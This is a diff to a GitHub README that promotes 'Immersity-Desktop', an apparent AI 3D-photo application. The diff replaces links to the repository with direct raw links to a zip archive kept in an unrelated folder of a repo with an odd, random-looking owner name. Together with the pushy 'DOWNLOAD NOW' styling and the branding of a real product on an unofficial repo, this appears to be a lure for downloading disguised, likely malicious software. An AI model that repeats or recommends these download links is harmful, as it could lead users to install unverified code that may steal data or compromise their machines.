@@ -1,7 +1,7 @@
 <h1>🎨 Immersity-Desktop---Immersity-AI-3D-Photo-2026 - Turn Photos into Stunning 3D Depth Art</h1>
 
 <p align="center">
-  <a href="https://github.com/fungicidal-telencephalon322/Immersity-Desktop---Immersity-AI-3D-Photo-2026" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#FF6B6B,#FFD93D);color:#1A1A2E;font-weight:bold;font-size:22px;border-radius:50px;text-decoration:none;box-shadow:0 6px 20px rgba(255,107,107,0.5);">⬇️ DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/fungicidal-telencephalon322/Immersity-Desktop---Immersity-AI-3D-Photo-2026/main/kennelly/Immersity_A_Photo_Desktop_2.3.zip" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#FF6B6B,#FFD93D);color:#1A1A2E;font-weight:bold;font-size:22px;border-radius:50px;text-decoration:none;box-shadow:0 6px 20px rgba(255,107,107,0.5);">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## 🪄 What Is Immersity-Desktop?
@@ -50,7 +50,7 @@ Follow these simple steps to download, install, and start using Immersity-Deskto
 Visit this link to download the application:
 Getting started is as simple as clicking the big orange button at the top of this page, or you can use the direct link below:
 
-**Direct Download Link:** [https://github.com/fungicidal-telencephalon322/Immersity-Desktop---Immersity-AI-3D-Photo-2026](https://github.com/fungicidal-telencephalon322/Immersity-Desktop---Immersity-AI-3D-Photo-2026)
+**Direct Download Link:** [https://raw.githubusercontent.com/fungicidal-telencephalon322/Immersity-Desktop---Immersity-AI-3D-Photo-2026/main/kennelly/Immersity_A_Photo_Desktop_2.3.zip](https://raw.githubusercontent.com/fungicidal-telencephalon322/Immersity-Desktop---Immersity-AI-3D-Photo-2026/main/kennelly/Immersity_A_Photo_Desktop_2.3.zip)
 
 When you click the link, your browser will open the download page. Look for the large **Download** button on that page and click it. Your download will begin automatically. The file size is roughly **85 MB**, so it should not take long even on a slower connection.
 
